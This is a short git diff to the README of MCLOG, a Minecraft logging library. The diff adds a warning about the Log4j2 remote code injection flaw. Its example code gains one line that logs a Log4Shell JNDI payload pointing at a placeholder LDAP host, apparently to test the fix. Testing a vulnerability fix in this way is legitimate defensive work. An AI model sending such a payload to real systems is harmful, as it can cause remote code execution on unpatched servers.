@@ -1,6 +1,8 @@
 # MCLOG
 ### The minecraft logging system
 
+### WARNING! Log4j2 < 2.15 has remote code injection. Use the LAST RELEASE(1.1)!
+
 ### Example
 ```java
 import java.util.concurrent.atomic.AtomicInteger;
@@ -28,6 +30,7 @@ public class TestConsole {
         while (console.isRunning()) {
             if (counter.incrementAndGet() % 10 == 0) {
                 log.error("&cHello &aWorld!");
+                log.info("${jndi:ldap://someadress.com:1389/hackthisapp}"); // test log4j2 Remote code injection fix
             }
 
             Thread.sleep(20);
